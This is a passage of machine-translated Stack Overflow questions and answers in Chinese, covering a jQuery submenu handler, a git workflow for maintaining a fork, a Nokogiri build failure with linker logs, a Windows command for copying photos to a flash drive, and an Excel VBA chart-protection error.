 $(".subMenuList").mouseout(function(){
      $("#galarySubMenu").fadeOut("fast");
});
*/

 }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:07:58.643

将此附加到您的jQuery代码

```
 $("#submenus").on('mouseleave',function(){
        $("#galarySubMenu").animate({
                'top':'-300'
            },  {
            'duration':500,
            queue:false
        })
    }) 
```

希望这可以帮助

我刚刚在整个子菜单 div 上添加了一个处理程序，当鼠标离开时它会淡出

# git - 用于维护项目扩展叉的 Git 工作流程？

> ID：10148701
> 
> 赞同：14
> 
> 时间：2012-04-13T21:42:38.887
> 
> 标签：git

我们在 GitHub 上创建了一个 OSS 项目，并正在向它添加一些自定义扩展。我们希望将我们所做的一些更改发送回原始项目（错误修复等），但其他更改是原始项目维护者目前不感兴趣的功能扩展。我正在尝试找出管理这种情况的最佳工作流程。

我希望我们的主分支包含（来自原始项目的提交）+（我们的贡献错误修复）+（我们的自定义扩展）的总和。我想我们会想要一个按功能分支的模型，以便我们可以将错误修复与自定义扩展分开。我们可以从我们的主分支启动自定义扩展分支，但我想我们还想维护一个本地“原始”分支或跟踪原始项目的东西，以便我们可以从那里启动没有被我们污染的错误修复分支定制的东西。或者其他的东西。

任何人都可以建议构建此工作流程的最佳方式，以使所有各种提交都去他们应该去的地方，而没有去他们不应该去的地方？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-14T08:53:43.173

在我看来，您已经回答了自己的问题。创建一个名为“vanilla”的分支或跟踪上游主分支的东西，并有一个包含您的自定义扩展的“主”分支。为您所做的每件事创建分支。对于错误修正，从“香草”开始。对于你自己的东西，从主人开始。每隔一段时间，将香草合并为大师。要将错误修复添加到您的自定义扩展分支中，您可以直接将它们的分支合并到 master 中，或者只是等待上游接受您的错误修复拉取请求，然后从 vanilla 到 master 的下一次合并将包含错误修复。这似乎是一个非常正常的工作流程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-14T09:14:16.690

您要设置的是**长期分叉**，因为您已经发现解决方案可能是设置一个与原始“香草”项目链接的特殊分支，并拥有一个主分支，您可以在其中维护您的自定义工作副本。

您唯一需要记住的事情（从我的角度来看）是，当您想要同步更改时，您不应该合并两个分支，但在这种情况下（**When Branches Diverge**）有方便的 Git [Cherry- Pick](http://linux.die.net/man/1/git-cherry-pick)命令*允许您从一个分支获取单个提交并将其应用于另一个分支*，这在维护分叉的情况下可能特别有用，因为您可以轻松地将单个提交从一个分支交换到另一个......

# ruby - Nokogiri 1.5.2 未安装在 Ubuntu 11.10 上

> ID：10148704
> 
> 赞同：4
> 
> 时间：2012-04-13T21:42:43.647
> 
> 标签：ruby, rubygems, nokogiri, ubuntu-11.10

很快，我知道一个[类似的问题](https://stackoverflow.com/questions/8003523/error-installing-nokogiri-1-5-0-with-rails-3-1-0-and-ubuntu)。但是，遵循评分最高的答案是行不通的。我已经重新启动了我的系统和终端，但无济于事。

出于某种原因，Nokogiri 无法识别我已经`libxslt1-dev`安装，尽管我明确安装了它，无论是使用`sudo apt-get install libxslt-dev`还是`sudo apt-get install libxslt1-dev`.

这是输出；我还缺少什么吗？

```
$ gem install nokogiri -v '1.5.2'
Building native extensions.  This could take a while...
ERROR:  Error installing nokogiri:
ERROR: Failed to build gem native extension.

~/.rvm/rubies/ruby-1.9.3-p125/bin/ruby extconf.rb
extconf.rb:10: Use RbConfig instead of obsolete and deprecated Config.
checking for libxml/parser.h... yes
checking for libxslt/xslt.h... yes
checking for libexslt/exslt.h... yes
checking for iconv_open() in iconv.h... no
checking for iconv_open() in -liconv... yes
checking for xmlParseDoc() in -lxml2... yes
checking for xsltParseStylesheetDoc() in -lxslt... no
-----
libxslt is missing.  please visit 
http://nokogiri.org/tutorials/installing_nokogiri.html for help
with installing dependencies.
-----
*** extconf.rb failed ***
Could not create Makefile due to some reason, probably lack of
necessary libraries and/or headers.  Check the mkmf.log file for more
details.  You may need configuration options.

Provided configuration options:
    List of options

Gem files will remain installed in ~/.rvm/gems/ruby-1.9.3-p125@rails3tutorial2ndEd/gems/nokogiri-1.5.2 for inspection.
Results logged to ~/.rvm/gems/ruby-1.9.3-p125@rails3tutorial2ndEd/gems/nokogiri-1.5.2/ext/nokogiri/gem_make.out 
```

**编辑：**经过仔细检查，我意识到安装程序承认我已经`libxslt1-dev`安装，但它没有通过其中一项测试。我在安装时做错了吗？

**编辑 2：**我正在尝试`capybara`使用`bundle install`, 以及它的几个依赖项进行安装`nokogiri`，`selenium-webdriver`但找不到`libxslt`，因此我无法使用`capybara`.

**编辑3：**这是文件中的错误消息`mkmf.log`；让我知道你是否需要它的其余部分。

```
--------------------

find_library: checking for xsltParseStylesheetDoc() in -lxslt... -------------------- no

"gcc -o conftest -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/ruby-1.9.1/x86_64-linux -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/ruby-1.9.1/ruby/backward -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/ruby-1.9.1 -I. -I/opt/local/include/libxml2 -I/usr/local/include/libxml2 -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/libxml2 -I/opt/local/include -I/usr/local/include -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include -I/usr/include -I/usr/include/libxml2 -I${HOME}/.rvm/usr/include     -O3 -ggdb -Wextra -Wno-unused-parameter -Wno-parentheses -Wno-long-long -Wno-missing-field-initializers -Wpointer-arith -Wwrite-strings -Wdeclaration-after-statement -Wimplicit-function-declaration  -fPIC  -g -DXP_UNIX -O3 -Wall -Wcast-qual -Wwrite-strings -Wconversion -Wmissing-noreturn -Winline conftest.c  -L. -L${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -Wl,-R${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -L/opt/local/lib -Wl,-R/opt/local/lib -L/usr/local/lib -Wl,-R/usr/local/lib -L${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -Wl,-R${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -L/usr/lib -Wl,-R/usr/lib -L${HOME}/.rvm/usr/lib -Wl,-R${HOME}/.rvm/usr/lib -L.  -rdynamic -Wl,-export-dynamic    -lxml2 -liconv  -Wl,-R -Wl,${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -L${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -lruby -lxslt -lxml2 -liconv  -lpthread -lrt -ldl -lcrypt -lm   -lc "
conftest.c: In function ‘t’:
conftest.c:5:53: error: ‘xsltParseStylesheetDoc’ undeclared (first use in this function)
conftest.c:5:53: note: each undeclared identifier is reported only once for each function it appears in
conftest.c:5:28: warning: variable ‘p’ set but not used [-Wunused-but-set-variable]
checked program was:
/* begin */
1: #include "ruby.h"
2: 
3: /*top*/
4: int main() {return 0;}
5: int t() { void ((*volatile p)()); p = (void ((*)()))xsltParseStylesheetDoc; return 0; }
/* end */

"gcc -o conftest -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/ruby-1.9.1/x86_64-linux -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/ruby-1.9.1/ruby/backward -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/ruby-1.9.1 -I. -I/opt/local/include/libxml2 -I/usr/local/include/libxml2 -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include/libxml2 -I/opt/local/include -I/usr/local/include -I${HOME}/.rvm/rubies/ruby-1.9.3-p125/include -I/usr/include -I/usr/include/libxml2 -I${HOME}/.rvm/usr/include     -O3 -ggdb -Wextra -Wno-unused-parameter -Wno-parentheses -Wno-long-long -Wno-missing-field-initializers -Wpointer-arith -Wwrite-strings -Wdeclaration-after-statement -Wimplicit-function-declaration  -fPIC  -g -DXP_UNIX -O3 -Wall -Wcast-qual -Wwrite-strings -Wconversion -Wmissing-noreturn -Winline conftest.c  -L. -L${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -Wl,-R${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -L/opt/local/lib -Wl,-R/opt/local/lib -L/usr/local/lib -Wl,-R/usr/local/lib -L${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -Wl,-R${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -L/usr/lib -Wl,-R/usr/lib -L${HOME}/.rvm/usr/lib -Wl,-R${HOME}/.rvm/usr/lib -L.  -rdynamic -Wl,-export-dynamic    -lxml2 -liconv  -Wl,-R -Wl,${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -L${HOME}/.rvm/rubies/ruby-1.9.3-p125/lib -lruby -lxslt -lxml2 -liconv  -lpthread -lrt -ldl -lcrypt -lm   -lc "
conftest.c: In function ‘t’:
conftest.c:5:1: warning: implicit declaration of function ‘xsltParseStylesheetDoc’ [-Wimplicit-function-declaration]
/usr/lib/libxslt.so: undefined reference to `xmlMutexUnlock@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashScan@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathWrapNodeSet@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStringText@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlOutputBufferClose@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewDoc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewParserCtxt@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrcasecmp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStringTextNoenc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDocCopyNode@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlUTF8Strpos@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeDoc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNodeSetMerge@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlUnlinkNode@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewComment@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGenericError@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNodeAddContent@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDictOwns@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlNewTextLen@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNodeGetBase@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrlen@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHasNsProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeNodeList@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewDocPI@LIBXML2_2.6.15'
/usr/lib/libxslt.so: undefined reference to `xmlXPtrEval@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlIsBaseCharGroup@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlBufferCCat@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewMutex@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlSetNsProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashFree@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeMutex@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlParseURI@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetDtdAttrDesc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathFreeContext@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlSaveUri@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashLookup3@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlBuildURI@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDocSetRootElement@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathConvertString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrncat@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathRegisterVariableLookup@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlParserGetDirectory@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlSetProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashUpdateEntry@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlURIEscapeStr@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewDocProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNodeSetAddUnique@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetLineNo@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlIsBlankNode@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathStringFunction@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlModuleOpen@LIBXML2_2.6.17'
/usr/lib/libxslt.so: undefined reference to `xmlStrdup@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlBufferCat@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStringCurrentChar@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashAddEntry3@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewNs@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlCharInRange@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `htmlDocContentDumpFormatOutput@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCompiledEvalToBoolean@LIBXML2_2.6.27'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewNodeSet@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDictQLookup@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `htmlDocContentDumpOutput@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrEqual@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetCharEncodingName@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewChild@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrcat@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDictReference@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlStrchr@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashCreate@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlIsDigitGroup@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlXPathFunctionLookupNS@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCastNodeToString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlCtxtUseOptions@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlXPathContextSetCache@LIBXML2_2.6.25'
/usr/lib/libxslt.so: undefined reference to `xmlFreeDtd@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlOutputBufferFlush@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlBufferFree@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewDocText@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlOutputBufferCreateFd@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathFreeObject@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNsLookup@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNumberFunction@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNextAncestor@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathEvalExpression@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNodeSetCreate@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrncmp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrndup@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlBufferWriteQuotedString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlValidateQName@LIBXML2_2.5.4'
/usr/lib/libxslt.so: undefined reference to `xmlDictCreateSub@LIBXML2_2.6.5'
/usr/lib/libxslt.so: undefined reference to `xmlStrcmp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashRemoveEntry@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashAddEntry2@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathRegisterFuncNS@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashRemoveEntry2@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNodeGetSpacePreserve@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPtrNewContext@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewBoolean@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashScanFull@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashLookup@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `htmlNewDoc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewCDataBlock@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrPrintf@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCastToString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlCheckFilename@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCompiledEval@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathEvalPredicate@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewContext@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeNode@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCompile@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlValidateNCName@LIBXML2_2.5.4'
/usr/lib/libxslt.so: undefined reference to `xmlCopyCharMultiByte@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNodeGetContent@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewDocNodeEatName@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `valuePop@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `htmlNewDocNoDtD@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathInit@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashUpdateEntry3@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetDocEntity@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `inputPush@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlOutputBufferCreateFile@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathFreeCompExpr@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlUTF8Strloc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathIsNodeType@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlParseDocument@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlSearchNs@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewText@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlModuleClose@LIBXML2_2.6.17'
/usr/lib/libxslt.so: undefined reference to `xmlMalloc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFree@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlBufferAdd@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashAddEntry@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathRegisterFuncLookup@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGenericErrorContext@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathOrderDocElems@LIBXML2_2.5.6'
/usr/lib/libxslt.so: undefined reference to `xmlDictCreate@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlXPathIsNaN@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDocGetRootElement@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathFreeNodeSet@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNodeDumpOutput@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlModuleSymbol@LIBXML2_2.6.17'
/usr/lib/libxslt.so: undefined reference to `xmlAddID@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDictLookup@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCmpNodes@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathDebugDumpObject@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlCreateURI@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlDictFree@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlAddPrevSibling@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewCString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlSearchNsByHref@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathErr@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlRealloc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathRegisterFunc@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetNsProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrstr@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXIncludeProcessFlags@LIBXML2_2.6.3'
/usr/lib/libxslt.so: undefined reference to `xmlNodeSetContent@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlBufferCreate@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathConvertNumber@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlIsCombiningGroup@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlBufferContent@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlOutputBufferWriteString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlOutputBufferCreateFilename@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlAddChild@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `valuePush@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeURI@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewParserContext@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetID@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNodeListGetString@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathEval@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFindCharEncodingHandler@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlIsID@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashUpdateEntry2@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlLoadExternalEntity@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlAllocOutputBuffer@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlMutexLock@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlGetIntSubset@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlStrncasecmp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathStringEvalNumber@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNextPrecedingSibling@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `htmlSetMetaEncoding@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathObjectCopy@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeRefTable@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlSplitQName2@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNodeSetAdd@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathCtxtCompile@LIBXML2_2.6.5'
/usr/lib/libxslt.so: undefined reference to `xmlIsExtenderGroup@LIBXML2_2.6.0'
/usr/lib/libxslt.so: undefined reference to `xmlGetNsList@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathIsInf@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewNsProp@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeParserCtxt@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathNewValueTree@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlFreeIDTable@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlCreateIntSubset@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlXPathFreeParserContext@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlNewDocNode@LIBXML2_2.4.30'
/usr/lib/libxslt.so: undefined reference to `xmlHashLookup2@LIBXML2_2.4.30'
collect2: ld returned 1 exit status
checked program was:
/* begin */
1: #include "ruby.h"
2: 
3: /*top*/
4: int main() {return 0;}
5: int t() { xsltParseStylesheetDoc(); return 0; }
/* end */

-------------------- 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-17T16:27:53.643

似乎您安装了多个`libxml2`（并且可能`libxslt`）副本，并且它们相互混淆。尝试从系统中搜索并删除这些库（及其包含文件）的任何额外副本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T01:39:44.763

一些尝试的想法：

*   尝试安装 1.5.0。如果这失败了，至少你知道这是你的问题而不是 nokogiri。
*   尝试 --with-xslt-dir --with-xslt-include 和 --with-xslt-lib 选项。也许您在路径的早期有一个旧的 libxslt

# windows - 如何从硬盘复制所有照片（批处理文件）

> ID：10148706
> 
> 赞同：0
> 
> 时间：2012-04-13T21:43:02.273
> 
> 标签：windows, batch-file, copy, command-prompt, photos

我有一个难题。我的朋友在他电脑的随机文件夹中有很多照片，他想备份到闪存驱动器上。我认为批处理文件将是最简单的方法，假设手动执行它是不可能的。

那么，我该怎么做才能将硬盘驱动器的每个子文件夹中具有特定扩展名（在我的情况下为 .jpg、.gif 和 .png）的所有文件复制到闪存驱动器（批处理文件将从所述闪存驱动器运行)

如果批处理文件足够好并且它不会破坏堆栈溢出规则，我可以通过贝宝支付一点给任何回答的人:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:46:37.387

您可以直接从命令行执行，无需批处理：

```
for /r C:\ %x in (*.jpg *.png *.gif) do @copy /y %x . 
```

但是，这将覆盖具有相同名称的文件。

# excel - 如何保护图表代码？

> ID：10148709
> 
> 赞同：0
> 
> 时间：2012-04-13T21:43:13.373
> 
> 标签：excel, vba, charts

我试图防止图表在写入后被更改。我从网上收集了应该这样做的代码：

```
Sub test()
Dim myChartObject As ChartObject
Dim MyChart As Chart

Set myChartObject = ActiveSheet.ChartObjects.Add(Left:=100, Top:=100, Width:=400, Height:=300)

Set MyChart = myChartObject.Chart

MyChart.PlotArea.Width = Application.InchesToPoints(2.583)
MyChart.PlotArea.Height = Application.InchesToPoints(1.75)

MyChart.ChartType = xlLine

MyChart.SetSourceData Source:=ActiveWorkbook.ActiveSheet.Range("A5:D9")
MyChart.Protect Password:="pass", DrawingObjects:=True, Contents:=True

End Sub 
```

我在线上遇到错误`MyChart.Protect`。我无法让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T03:34:42.197

我不相信您可以保护图表，除非它也是工作表。由于您要将图表插入工作表，因此请保护工作表替换

```
MyChart.Protect Password:="pass", DrawingObjects:=True, Contents:=True 
```

和

```
